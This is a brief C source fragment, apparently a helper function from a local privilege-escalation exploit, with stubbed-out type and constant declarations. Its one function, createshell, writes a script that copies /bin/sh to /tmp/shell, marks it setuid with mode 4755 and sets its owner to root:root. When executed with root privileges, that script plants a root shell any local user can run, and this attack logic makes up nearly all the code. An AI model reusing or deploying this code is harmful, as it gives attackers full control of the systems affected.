
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int FILENAME ;
 int O_CREAT ;
 int O_RDWR ;
 int S_IRWXU ;
 int S_IXGRP ;
 int S_IXOTH ;
 int close (int) ;
 int errx (int,char*,int ) ;
 int open (int ,int,int) ;
 int strlen (char*) ;
 int write (int,char*,int ) ;

void createshell(void) {
 int fd;
 char *s="/bin/cp /bin/sh /tmp/shell\n"
  "/bin/chmod 4755 /tmp/shell\n"
  "/bin/chown root:root /tmp/shell\n";

 fd = open(FILENAME, O_RDWR|O_CREAT, S_IRWXU|S_IXGRP|S_IXOTH);
 if (fd < 0)
  errx(1, "cannot open %s for writing", FILENAME);

 write(fd, s, strlen(s));
 close(fd);
}
